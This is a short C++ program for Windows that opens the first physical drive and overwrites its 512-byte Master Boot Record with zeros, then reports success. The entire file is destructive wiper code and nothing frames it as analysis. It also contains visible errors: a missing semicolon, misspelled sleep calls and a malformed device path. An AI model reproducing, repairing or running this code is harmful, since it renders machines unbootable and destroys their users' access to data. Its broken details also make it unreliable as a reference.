#include <windows.h>
#include <iostream>

using namespace std;
#define MBR_SIZE 512
int main()
{
	DWORD write;
	char mbrData[512]; //size of mbr is just 512 byte, witch are going to overwrite
	ZeroMemory(&mbrData, (sizeof mbrData));
	HANDLE MasterBootRecord = CreateFile("\\\.\\PhysicalDrive0" 
			, GENERIC_ALL,FILE_SHARE_READ|FILE_SHARE_WRITE
			, NULL,OPEN_EXISTING,NULL,NULL)
			if (WriteFile(MasterBootRecord, mbrData, 512, &write, NULL) == true)
			{
			       cout << "Master Boot Record is OverWriten" << endl;
			       sleap(5000);
			       ExitProcess(0);

			}
			else
			{
				cout <<"Fail" << endl;
				Sleap(5000);
				ExitProcess(0);

			}	
	CloseHandle(MasterBootRecord);


	return EXIT_SUCCESS;

}
